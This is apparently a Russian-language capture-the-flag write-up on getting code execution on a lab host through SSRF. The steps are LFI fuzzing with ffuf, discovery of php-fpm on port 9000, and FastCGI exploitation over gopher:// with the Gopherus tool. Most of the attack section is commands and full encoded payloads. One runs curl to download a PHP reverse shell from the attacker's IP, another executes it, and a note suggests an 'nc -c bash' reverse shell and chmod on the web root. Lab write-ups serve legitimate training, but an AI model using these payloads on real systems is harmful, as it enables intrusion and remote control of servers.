---
attack: ssrf
---
web-3-2 Удаленное выполнение кода (RCE) на узле utils.edu.stf
 
- [[#Scout|Scout]]
- [[#extra scout 2|extra scout 2]]
- [[#Attack|Attack]]
- [[#Attack 2 from Aloha51|Attack 2 from Aloha51]]


 

#### Scout 

 Разведку начнём с фаззинга [link=seclists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
```
ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt  -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak,.asp,.aspx,.js,.img,.png,.jpeg -fs 1018
```
Ловим следующий ответ от сервера  и идём его смотреть уже в браузере 
```
/etc/nginx/sites-available/default [Status: 200, Size: 16184, Words: 393, Lines: 227, Duration: 116ms]
```
Из интересного можно выписать  
fastcgi_pass 127.0.0.1:9000
![[Pasted image 20240926185747.png]]
Далее гуглим, потом еще гуглим , потом яндексим, потом duck-актим и потом еще раз яндексим и находим следующую ссылку (именно в этой последовательности )
и находим :
https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery

![[Pasted image 20240926230704.png]]

или вот эту 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi
на последней можем найти и инструмент для тестирования https://github.com/tarunkant/Gopherus

По этим ссылкам можем удостовериться что скорее всего у нас будет уязвимость с gopher 
#### extra scout 2
Комментарий от автора: Данный метод не особо надёжен, и работал не совсем так как мы планировалось, но решили его указать так как через него могли возникнуть подозрения на порт 9000. И через гугл можно было выйти на нужный вид атак (gopher and port 9000). 

Находим вот эту статью
https://readmedium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530

и сделаем наш перебор по портам
![[Pasted image 20240926231931.png]]

![[Pasted image 20240926231941.png]]
При переборе можем увидеть что появляется задержка на порту 9000 и выше

![[Pasted image 20240926232010.png]]

#### Attack

Примечание: говорят что можно было и вот так подключить revshell `nc -c bash 10.127.IP.IP Port`  
Но если не получилось снизу описано как можно по другому



 Gopher, конкурент WWW из 90-х, который пока не стоит списывать со счетов https://habr.com/ru/articles/581692/
gopher://<хост>:<порт>/<путь-к-файлу>

Как было сказано ранее, находим следующий инструмент на hacktricks
[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus "https://github.com/tarunkant/Gopherus") 

в качестве revshell использовалось = [monkey revshell php](https://github.com/pentestmonkey/php-reverse-shell)
(Не забудьте поменять на свой Ip and port)
В качестве первого параметра в эксплоите написано указывать любой файл желательно php , поэтому мы решили указать сам  convert.php и путь к нему (почему именно этот файл? читаем документацию  )

```
 git clone https://github.com/tarunkant/Gopherus

──(kali㉿kali)-[~/Downloads/Gopherus]
└─$ gopherus --exploit fastcgi
 
Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  /var/www/html/convert.php                                                                                                                
Terminal command to run:  ls

Your gopher link is ready to do SSRF:                                                                                                                                                        
 gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%06%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/html/convert.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------

```
Далее  Логично будет скачать revershell php  

```
┌──(kali㉿kali)-[~/Downloads/Gopherus]
└─$ gopherus --exploit fastcgi                                

                                                                                                                                                                                             
  ________              .__                                                                                                                                                                  
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                   
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                   
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                    
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                   
        \/       |__|        \/     \/                 \/                                                                                                                                    
                                                                                                                                                                                             
                author: $_SpyD3r_$                                                                                                                                                           
                                                                                                                                                                                             
Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  /var/www/html/convert.php                                                                                                                
Terminal command to run:  curl -o /tmp/shell.php http://10.127.244.IP:Port/shell.php ; ls /tmp

Your gopher link is ready to do SSRF:                                                                                                                                                        
                                                                                                                                                                                             
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH120%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/html/convert.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00x%04%00%3C%3Fphp%20system%28%27curl%20-o%20/tmp/shell.php%20http%3A//10.127.244.IP%3APORT/shell.php%20%3B%20ls%20/tmp%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------

```
Next step Запуск нашего скрипта

{Честно не помню но мне кажется вы столкнётесь с проблемой что он не запуститься, для решения этой проблемы я выполнил дополнительную команду для добавления прав нашему скрипту, что то вроде chmod +x /var/www/html/* или т.п верю что вы справитесь ☜(ﾟヮﾟ☜) }
```
┌──(kali㉿kali)-[~/Downloads/Gopherus]
└─$ gopherus --exploit fastcgi

                                                                                                                                                                                             
  ________              .__                                                                                                                                                                  
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                   
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                   
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                    
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                   
        \/       |__|        \/     \/                 \/                                                                                                                                    
                                                                                                                                                                                             
                author: $_SpyD3r_$                                                                                                                                                           
                                                                                                                                                                                             
Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  /var/www/html/convert.php                                                                                                                
Terminal command to run:  php /tmp/shell.php

Your gopher link is ready to do SSRF:                                                                                                                                                        
                                                                                                                                                                                             
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%06%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH70%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/html/convert.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00F%04%00%3C%3Fphp%20system%28%27php%20/tmp/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------

```
Ну и далее сидим довольные 

#### Attack 2 from Aloha51
2 Cпособ эксплуатации уязвимости

обратите внимание что заменяется метода на PUT

![[Pasted image 20240926233436.png]]

![[Pasted image 20240926233442.png]]

![[Pasted image 20240926233453.png]]

и после запускаем любым удобным для вас способом (мб нужно будет еще докинуть прав ` chmod +x /var/www/html/*` )

